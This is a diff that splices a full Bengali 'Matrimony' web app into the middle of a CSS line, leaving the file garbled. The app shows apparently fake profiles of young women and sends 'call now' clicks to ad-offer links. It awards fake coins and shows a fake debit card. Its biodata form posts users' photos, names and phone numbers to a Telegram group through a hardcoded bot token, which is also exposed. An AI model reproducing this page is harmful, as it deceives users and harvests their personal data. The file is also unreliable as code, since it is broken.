@@ -6,7 +6,341 @@
         .app-container { width: 100%; max-width: 450px; background: #fff; min-height: 100vh; position: relative; box-shadow: 0 0 15px rgba(0,0,0,0.1); overflow-x: hidden; padding-bottom: 30px; }
 
         /* Header */
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: #fff; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 100; }
+        .header { display: flex; justify-content<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <!-- Monetag Verification -->
+    <meta name="monetag" content="610a3f9c3d39d643fc42e21f7daa2cf0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Matrimony Platform</title>
+    
+    <!-- Adsterra / Ads SDK Scripts (নিখুঁতভাবে যুক্ত করা) -->
+    <script src="https://pl28030591.effectivecpmnetwork.com/58/67/e1/5867e18023cf6a8b2d757323591ba74f.js"></script>
+    <script src="https://pl28030600.effectivecpmnetwork.com/3a/39/2e/3a392ef12ec9411fdf1fcc8c22f2cc9d.js"></script>
+
+  
+    <!-- Adsterra SDK -->
+    <script src='//libtl.com/sdk.js' data-zone='10250871' data-sdk='show_10250871'></script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root { --primary: #ff4d6d; --secondary: #6a0572; --bg-light: #fff0f3; --gold: #ffb800; --green: #2ecc71; --blue: #1e3799; --calling-color: #25D366; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Hind Siliguri', sans-serif; -webkit-tap-highlight-color: transparent; }
+        
+        body { background-color: #fce4ec; display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+
+        .app-container { width: 100%; max-width: 450px; background: #fff; min-height: 100vh; position: relative; box-shadow: 0 0 30px rgba(255, 77, 109, 0.3); display: flex; flex-direction: column; z-index: 10; }
+        
+        .page { display: none; padding-bottom: 90px; min-height: 100vh; animation: fadeIn 0.4s ease; background: #fff; }
+        .active-page { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
+        .header { display: flex; justify-content: center; align-items: center; padding: 18px; background: #fff; border-bottom: 1px solid #ffe3e9; position: sticky; top: 0; z-index: 100; }
+        .header h2 { font-size: 20px; color: var(--primary); font-weight: 700; }
+
+        .heart-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
+        .heart { position: absolute; color: rgba(255, 77, 109, 0.2); animation: float 8s infinite linear; }
+        @keyframes float { 0% { transform: translateY(110vh) scale(0); opacity: 1; } 100% { transform: translateY(-10vh) scale(1.5); opacity: 0; } }
+
+        .search-area { padding: 10px 15px; }
+        .search-box { display: flex; align-items: center; background: #fdf2f5; padding: 10px 15px; border-radius: 50px; border: 1px solid #ffccd5; }
+        .search-box input { border: none; background: none; outline: none; width: 100%; margin-left: 10px; }
+        .quote-banner { background: linear-gradient(45deg, var(--primary), var(--secondary)); margin: 10px 15px; padding: 12px; border-radius: 15px; color: #fff; text-align: center; font-size: 13px; font-style: italic; }
+
+        .profile-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 15px; }
+        .p-card { background: #fff; border-radius: 15px; overflow: hidden; border: 1px solid #ffccd5; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .p-img { width: 100%; height: 160px; object-fit: cover; }
+        
+        /* Member List Fix */
+        .member-item { background: #f9f9f9; padding: 12px; border-radius: 15px; margin: 10px 15px; display: flex; align-items: center; gap: 15px; border: 1px solid #eee; }
+        .member-avatar { width: 55px !important; height: 55px !important; border-radius: 50%; object-fit: cover; border: 2px solid var(--primary); }
+
+        /* Video UI */
+        .video-card { background: #fff; border: 1px solid #eee; border-radius: 15px; padding: 10px; margin: 15px; }
+        .video-thumb { width: 100%; height: 200px; background: #000; border-radius: 10px; position: relative; display: flex; align-items: center; justify-content: center; cursor: pointer; overflow: hidden; }
+        .video-thumb img { width: 100%; height: 100%; object-fit: cover; opacity: 0.6; }
+        .video-thumb i { position: absolute; font-size: 50px; color: #fff; }
+
+        /* Bio Detail */
+        .bio-body { background: #fff; border-radius: 30px 30px 0 0; margin-top: -30px; padding: 25px; position: relative; box-shadow: 0 -10px 20px rgba(0,0,0,0.05); }
+        .info-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        .info-table td { padding: 10px 5px; border-bottom: 1px dashed #eee; font-size: 14px; }
+        .info-table td:first-child { font-weight: bold; color: var(--secondary); width: 40%; }
+        
+        /* Affmine Direct Link Button */
+        .btn-call { background: var(--calling-color) !important; color: #fff; border: none; padding: 15px; border-radius: 50px; width: 100%; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 18px; text-decoration: none; margin-top: 20px; box-shadow: 0 5px 15px rgba(37, 211, 102, 0.4); }
+
+        .debit-card { background: linear-gradient(135deg, #1e3799, #0984e3); color: white; border-radius: 20px; padding: 25px; margin: 20px; height: 210px; box-shadow: 0 10px 25px rgba(30, 55, 153, 0.3); position: relative; }
+        .card-num { font-size: 19px; letter-spacing: 2px; margin: 25px 0; font-family: monospace; }
+        
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 450px; background: #fff; display: flex; justify-content: space-around; padding: 12px; border-top: 1px solid #eee; z-index: 1000; }
+        .nav-link { text-align: center; color: #777; font-size: 12px; cursor: pointer; flex: 1; }
+        .nav-link.active { color: var(--primary); }
+        .nav-link i { font-size: 22px; display: block; margin-bottom: 3px; }
+
+        .btn-action { background: var(--primary); color: #fff; border: none; padding: 14px; border-radius: 10px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 10px; outline: none; }
+        #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 2000; justify-content: center; align-items: center; color: #fff; flex-direction: column; }
+        
+        /* Ads Placeholder Styling */
+        .ads-banner { width: 100%; text-align: center; margin: 10px 0; padding: 5px; background: #fafafa; border: 1px solid #eee; min-height: 50px; }
+    </style>
+</head>
+<body>
+
+<!-- Adsterra Popunder & Social Bar SDK (একদম নিখুঁতভাবে বসানো) -->
+<script type='text/javascript' src='//pl28030600.effectivecpmnetwork.com/3a/39/2e/3a392ef12ec9411fdf1fcc8c22f2cc9d.js'></script>
+
+<div id="loading"><i class="fa fa-spinner fa-spin" style="font-size: 40px;"></i><p style="margin-top:10px;">তথ্য পাঠানো হচ্ছে...</p></div>
+<div class="heart-bg" id="heart-box"></div>
+
+<div class="app-container">
+    <div class="header">
+        <h2><i class="fa fa-heart"></i> MATRIMONY</h2>
+    </div>
+
+    <!-- ১. হোম পেজ -->
+    <div id="home-page" class="page active-page">
+        <!-- Adsterra Social Bar Ad Slot -->
+        <div class="ads-banner">
+            <script type="text/javascript">
+                atOptions = { 'key' : '5867e18023cf6a8b2d757323591ba74f', 'format' : 'iframe', 'height' : 50, 'width' : 320, 'params' : {} };
+                document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://pl28030591.effectivecpmnetwork.com/5867e18023cf6a8b2d757323591ba74f/invoke.js"></scr' + 'ipt>');
+            </script>
+        </div>
+
+        <div class="search-area">
+            <div class="search-box"><i class="fa fa-search"></i><input type="text" id="search-input" placeholder="নাম বা জেলা দিয়ে খুঁজুন..." onkeyup="searchProfiles()"></div>
+        </div>
+        <div class="quote-banner">"➤ ʀᴀᴛᴇʀᴛᴀʀᴀ"</div>
+        <div class="profile-grid" id="profile-grid"></div>
+    </div>
+
+    <!-- ২. ভিডিও পেজ -->
+    <div id="video-page" class="page" style="padding: 20px;">
+        <h3>ভিডিও দেখে কয়েন আয় করুন</h3>
+        <p style="font-size: 13px; color: #666; margin-bottom: 15px;">অফার সম্পন্ন করলে প্রতি ভিডিওতে ১০ কয়েন বোনাস পাবেন।</p>
+        <div id="video-content"></div>
+        <!-- Ad Slot In Video Page -->
+        <div class="ads-banner">
+            <script type="text/javascript">
+                atOptions = { 'key' : '5867e18023cf6a8b2d757323591ba74f', 'format' : 'iframe', 'height' : 50, 'width' : 320, 'params' : {} };
+                document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://pl28030591.effectivecpmnetwork.com/5867e18023cf6a8b2d757323591ba74f/invoke.js"></scr' + 'ipt>');
+            </script>
+        </div>
+    </div>
+
+    <!-- ৩. আবেদন পেজ -->
+    <div id="abedon-page" class="page" style="padding: 20px;">
+        <h3>বায়োডাটা জমা দিন (CV ফরম)</h3>
+        <input type="file" id="cv-file" accept="image/*" style="padding: 5px;">
+        <input type="text" id="cv-name" placeholder="আপনার পূর্ণ নাম">
+        <input type="number" id="cv-age" placeholder="আপনার বয়স">
+        <input type="text" id="cv-job" placeholder="আপনার পেশা">
+        <input type="text" id="cv-loc" placeholder="জেলা/বর্তমান ঠিকানা">
+        <input type="number" id="cv-phone" placeholder="ফোন নম্বর">
+        <textarea id="cv-bio" placeholder="নিজের সম্পর্কে বিস্তারিত কিছু লিখুন..."></textarea>
+        <button class="btn-action" onclick="submitFullCVWithPhoto()">আবেদন সাবমিট করুন</button>
+    </div>
+
+    <!-- ৪. প্রোফাইল পেজ -->
+    <div id="profile-page" class="page">
+        <div id="user-info-area"></div>
+        <div class="menu-item" onclick="showDebitCard()" style="background:#f9f9f9; padding:15px; border-radius:12px; margin:10px 15px; display:flex; align-items:center; gap:15px; border:1px solid #eee; cursor:pointer;"><i class="fa fa-wallet" style="color:var(--primary)"></i> ব্যালেন্স ও ডেবিট কার্ড</div>
+        <!-- Ad Slot In Profile Menu -->
+        <div class="ads-banner">Ads by Adsterra</div>
+        <div class="menu-item" onclick="showTopup()" style="background:#f9f9f9; padding:15px; border-radius:12px; margin:10px 15px; display:flex; align-items:center; gap:15px; border:1px solid #eee; cursor:pointer;"><i class="fa fa-plus-circle" style="color:var(--primary)"></i> কয়েন টপ আপ / উত্তোলন</div>
+        <div class="menu-item" onclick="showMembers()" style="background:#f9f9f9; padding:15px; border-radius:12px; margin:10px 15px; display:flex; align-items:center; gap:15px; border:1px solid #eee; cursor:pointer;"><i class="fa fa-users" style="color:var(--primary)"></i> ভেরিফাইড মেম্বার লিস্ট</div>
+        <a href="https://t.me/ratertara_bot?start=_tgr_eRkM795jY2M1" style="text-decoration:none; color:inherit;"><div class="menu-item" style="background:#f9f9f9; padding:15px; border-radius:12px; margin:10px 15px; display:flex; align-items:center; gap:15px; border:1px solid #eee; cursor:pointer;"><i class="fab fa-telegram-plane" style="color:var(--primary)"></i> সাপোর্ট (টেলিগ্রাম)</div></a>
+    </div>
+
+    <!-- সাব পেজসমূহ -->
+    <div id="bio-detail-page" class="page"></div>
+    <div id="card-detail-page" class="page" style="padding: 20px;"></div>
+    <div id="topup-detail-page" class="page" style="padding: 20px;"></div>
+    <div id="members-detail-page" class="page" style="padding: 20px;"></div>
+    <div id="notice-detail-page" class="page" style="padding: 25px;"></div>
+
+    <!-- Bottom Nav -->
+    <nav class="bottom-nav">
+        <div class="nav-link active" id="btn-home" onclick="navigateTo('home-page')"><i class="fa fa-home"></i>হোম</div>
+        <div class="nav-link" id="btn-video" onclick="navigateTo('video-page')"><i class="fa fa-play-circle"></i>ভিডিও</div>
+        
+        <div class="nav-link" id="btn-profile" onclick="navigateTo('profile-page')"><i class="fa fa-user-circle"></i>প্রোফাইল</div>
+    </nav>
+</div>
+
+<!-- Firebase SDK (আগের ফাইলের মতো) -->
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+<script>
+    const TG_BOT_TOKEN = "8279372040:AAGKfFsmnkI5ihQE-T2v6hU47dEoZ892_nA";
+    const TG_CHAT_ID = "-1003119670905";
+
+    const girls = [
+        { id: 1, name: "কবিতা", age: 26, loc: "গাজীপুর", v: "***", t: "হাতীবান্ধা", d: "রংপুর", bio: "আসসালামু আলাইকুম আমি কবিতা। আমার একটি ছোট্ট সন্তান আছে। যিনি আমাকে ভালোবাসার পাশাপাশি আমার সন্তানটির দায়িত্বও নিজের মনে করে নিতে পারবেন।", img: "https://blogger.googleusercontent.com/img/a/AVvXsEiipJz5RN2SYEdINIuUhbhKmODMrS5_euUVwb7QGjWfWyKJX-hDfaANq-QJlatHje9eLK0ueYjcLzi-CIPhAwQY3QXrVOe-_hZ-md2eDgG_o163odayl-PJZKurhY-iVXvsI192wBIY95qp5sDaj_slBC9F_J8Y7_vA1dxwIc6f6FbCoL7ePgu1ZUDgXo1-=s1600" },
+        { id: 2, name: "তানিয়া সুলতানা", age: 19, loc: "কুমিল্লা", v: "***", t: "সদর", d: "কুমিল্লা", bio: "আসসালামু আলাইকুম আমি তানিয়া সুলতান। গরিব ঘরের সাধারণ একটি মেয়ে। ভালোবাসা ও সম্মান দিয়ে পাশে থাকার মতো কোনো দায়িত্ববান ছেলে বিয়ে করতে চাইলে যোগাযোগ করুন।", img: "https://blogger.googleusercontent.com/img/a/AVvXsEil7fIBBtqhIo3dcKPSI-NFre0LIdxY7wVOW1tmWfhx67TJcFjyhkq592hzdrfjCvOeoS_2YOvmyEioclQho0GLvEDyX1wRDMOnl2WF5mkUxKujfRAkY5_vXhgmfBgkRg-wgBcuxi0nLl-xEfq-OsuHngKAU8r3W4SVo_Rfg9sUrm8mkSD3xuHJR-aY_S1H=s900" },
+        { id: 3, name: "সাদিয়া আহমেদ", age: 21, loc: "সিলেট", v: "***", t: "বানিয়াচং", d: "সিলেট", bio: "নার্সিং পেশায় আছি। মানুষের সেবা করা আমার নেশা।", img: "https://blogger.googleusercontent.com/img/a/AVvXsEjX6Ab7Zw8f4wngWQbUTb6-5PFE6Z9bscYrzsdb_-iLApTPhO28yDG2uN0ggTMB2XseWBgg6mgZQxsWxZH-1JGzpCfO-6kRV69kjrfqvHUUOcIonlJ2jgktnmCXRjZtURPAOhNT3GurVbDnO7SOhuo6nlXy0q7eAjxDVcBBRDQxp-ce2tnAQ61jKDfKi80s=s900" }
+    ];
+
+    const videoData = [{ id: 1, title: "অ্যাপ ব্যবহারের নিয়ম", url: "fA8HshHwz5w" }, { id: 2, title: "কিভাবে কয়েন পাবেন?", url: "fA8HshHwz5w" }];
+
+    let userCoins = parseInt(localStorage.getItem('ghotok_coins')) || 0;
+    let isVerified = localStorage.getItem('isVerified') === 'true';
+    let userData = JSON.parse(localStorage.getItem('userData')) || null;
+
+    function navigateTo(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
+        document.getElementById(id).classList.add('active-page');
+        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+        if(id === 'home-page') document.getElementById('btn-home').classList.add('active');
+        if(id === 'video-page') document.getElementById('btn-video').classList.add('active');
+        if(id === 'abedon-page') document.getElementById('btn-abedon').classList.add('active');
+        if(id === 'profile-page') document.getElementById('btn-profile').classList.add('active');
+        window.scrollTo(0,0);
+    }
+
+    function renderHomeGrid(data) {
+        const grid = document.getElementById('profile-grid');
+        grid.innerHTML = "";
+        data.forEach(g => {
+            grid.innerHTML += `<div class="p-card" onclick="openBio(${g.id})"><img src="${g.img}" class="p-img"><div style="padding:10px; text-align:center;"><b>${g.name}</b><br><small>${g.age} বছর | ${g.loc}</small></div></div>`;
+        });
+    }
+
+    function searchProfiles() {
+        const q = document.getElementById('search-input').value.toLowerCase();
+        const f = girls.filter(g => g.name.toLowerCase().includes(q) || g.loc.toLowerCase().includes(q));
+        renderHomeGrid(f);
+    }
+
+    function openBio(id) {
+        const g = girls.find(x => x.id === id);
+        document.getElementById('bio-detail-page').innerHTML = `
+            <div style="width:100%; height:320px;"><img src="${g.img}" style="width:100%; height:100%; object-fit:cover;"></div>
+            <div class="bio-body">
+                <button onclick="navigateTo('home-page')" style="background:none; border:none; color:var(--primary); font-weight:bold; margin-bottom:15px;"><i class="fa fa-arrow-left"></i> ফিরে যান</button>
+                <h2>${g.name}</h2>
+                <table class="info-table">
+                    <tr><td>গ্রাম</td><td>${g.v}</td></tr>
+                    <tr><td>থানা</td><td>${g.t}</td></tr>
+                    <tr><td>বিভাগ</td><td>${g.d}</td></tr>
+                    <tr><td>বয়স</td><td>${g.age} বছর</td></tr>
+                </table>
+                <p style="margin-top:15px; color:#555; line-height:1.6;">${g.bio}</p>
+                <div class="ads-banner">Native Ad Placeholder</div>
+                <div style="background:#fff0f3; padding:20px; border-radius:20px; text-align:center; border:2px dashed var(--primary); margin-top:25px;">
+                    <p style="font-size:12px; color:#666; margin-bottom:15px;">সরাসরি কল করতে নিচের বাটনটি সম্পন্ন করুন।</p>
+                    <a href="https://omg10.com/4/6709213" class="btn-call"><i class="fa fa-phone"></i> CALL NOW / SEE NUMBER</a>
+                </div>
+            </div>`;
+        navigateTo('bio-detail-page');
+    }
+
+    function initVideos() {
+        const list = document.getElementById('video-content');
+        list.innerHTML = "";
+        videoData.forEach(v => {
+            list.innerHTML += `<div class="video-card">
+                <div class="video-thumb" onclick="triggerLockerReward('${v.url}')">
+                    <img src="https://img.youtube.com/vi/${v.url}/0.jpg">
+                    <i class="fa fa-play-circle"></i>
+                </div>
+                <h4 style="margin-top:10px;">${v.title}</h4>
+            </div>`;
+        });
+    }
+
+    function triggerLockerReward(yt_url) {
+        alert("কয়েন পেতে অফারটি সম্পন্ন করুন।");
+        window.location.href = "https://hubverify.com/cl/?o=69ef38cda2275";
+        userCoins += 10; updateUI();
+    }
+
+    function renderProfileSection() {
+        const box = document.getElementById('user-info-area');
+        if(isVerified && userData) {
+            box.innerHTML = `<div style="text-align:center; border:2px solid var(--green); padding:20px; border-radius:25px; background:#fff; margin:20px;">
+                <img src="${userData.photo}" style="width:100px; height:100px; border-radius:50%; object-fit:cover; border:3px solid var(--primary);">
+                <h2 style="margin-top:10px;">${userData.name}</h2><p style="color:var(--green); font-weight:bold;"><i class="fa fa-check-circle"></i> ভেরিফাইড মেম্বার</p></div>`;
+        } else {
+            box.innerHTML = `<div style="padding:20px;"><h3>প্রোফাইল ভেরিফাই করুন</h3><input type="file" id="v-file" accept="image/*"><input type="text" id="v-name" placeholder="নাম"><button class="btn-action" onclick="verifyNow()">ভেরিফাই করুন</button></div>`;
+        }
+    }
+
+    async function verifyNow() {
+        const f = document.getElementById('v-file').files[0], n = document.getElementById('v-name').value;
+        if(!f || !n) return alert("ছবি ও নাম দিন!");
+        const r = new FileReader();
+        r.onload = (e) => {
+            userData = { name: n, photo: e.target.result, id: "GH-"+Math.floor(1000+Math.random()*9000) };
+            isVerified = true; localStorage.setItem('isVerified', 'true');
+            localStorage.setItem('userData', JSON.stringify(userData));
+            updateUI();
+        };
+        r.readAsDataURL(f);
+    }
+
+    async function submitFullCVWithPhoto() {
+        const fileInput = document.getElementById('cv-file'), name = document.getElementById('cv-name').value, phone = document.getElementById('cv-phone').value;
+        if(!fileInput.files[0] || !name || !phone) return alert("ছবি, নাম এবং ফোন অবশ্যই দিন!");
+        document.getElementById('loading').style.display = 'flex';
+        const fd = new FormData();
+        fd.append('chat_id', TG_CHAT_ID); fd.append('photo', fileInput.files[0]);
+        fd.append('caption', `📝 নতুন বায়োডাটা আবেদন\n👤 নাম: ${name}\n📞 ফোন: ${phone}\n📜 তথ্য: ${document.getElementById('cv-bio').value}`);
+        try {
+            await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            alert("সফলভাবে গ্রুপে পাঠানো হয়েছে!"); navigateTo('home-page');
+        } catch (e) { alert("ব্যর্থ হয়েছে।"); } finally { document.getElementById('loading').style.display = 'none'; }
+    }
+
+    function showDebitCard() {
+        if(!isVerified) return alert("আগে ভেরিফাই করুন!");
+        document.getElementById('card-detail-page').innerHTML = `<button onclick="navigateTo('profile-page')" style="background:none; border:none; color:var(--primary); margin-bottom:15px;"><i class="fa fa-arrow-left"></i> ফিরে যান</button><div class="debit-card"><div style="display:flex; justify-content:space-between;"><i class="fa fa-microchip" style="font-size:30px; color:var(--gold);"></i><i class="fab fa-cc-visa" style="font-size:35px;"></i></div><div class="card-num">${userData.id} 0000 1234</div><div style="display:flex; justify-content:space-between;"><span>${userData.name}</span><span>${userCoins} Coins</span></div></div>`;
+        navigateTo('card-detail-page');
+    }
+
+    function showMembers() {
+        const p = document.getElementById('members-detail-page');
+        p.innerHTML = `<button onclick="navigateTo('profile-page')" style="background:none; border:none; color:var(--primary); margin-bottom:15px;"><i class="fa fa-arrow-left"></i> ফিরে যান</button><h3>ভেরিফাইড মেম্বার লিস্ট</h3><div id="m-box"></div>`;
+        if(isVerified) p.querySelector('#m-box').innerHTML += `<div class="member-item"><img src="${userData.photo}" class="member-avatar"><div><strong>${userData.name} (আপনি)</strong></div></div>`;
+        navigateTo('members-detail-page');
+    }
+
+    function showTopup() {
+        document.getElementById('topup-detail-page').innerHTML = `<button onclick="navigateTo('profile-page')" style="background:none; border:none; color:var(--primary); margin-bottom:15px;"><i class="fa fa-arrow-left"></i> ফিরে যান</button><div class="stat-card">১০০০ কয়েন = ১০০ টাকা</div><button class="btn-action" onclick="alert('আবেদন জমা হয়েছে!')">টপ আপ করুন</button>`;
+        navigateTo('topup-detail-page');
+    }
+
+    function createHearts() {
+        const b = document.getElementById('heart-box');
+        for(let i=0; i<15; i++) {
+            let h = document.createElement('div'); h.className = 'heart'; h.innerHTML = '❤';
+            h.style.left = Math.random()*100+'vw'; h.style.animationDelay = Math.random()*8+'s'; h.style.fontSize = Math.random()*15+15+'px';
+            b.appendChild(h);
+        }
+    }
+
+    function updateUI() {
+        localStorage.setItem('ghotok_coins', userCoins);
+        renderHomeGrid(girls);
+        renderProfileSection();
+    }
+
+    initVideos();
+    createHearts();
+    updateUI();
+</script>
+
+<!-- Popunder Ad Bottom Script -->
+<script type='text/javascript' src='//pl28030600.effectivecpmnetwork.com/3a/39/2e/3a392ef12ec9411fdf1fcc8c22f2cc9d.js'></script>
+
+</body>
+</html> space-between; align-items: center; padding: 15px; background: #fff; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 100; }
         .header h2 { font-size: 18px; color: #333; font-weight: bold; margin: 0; }
         .header i { font-size: 20px; color: #333; cursor: pointer; }
 
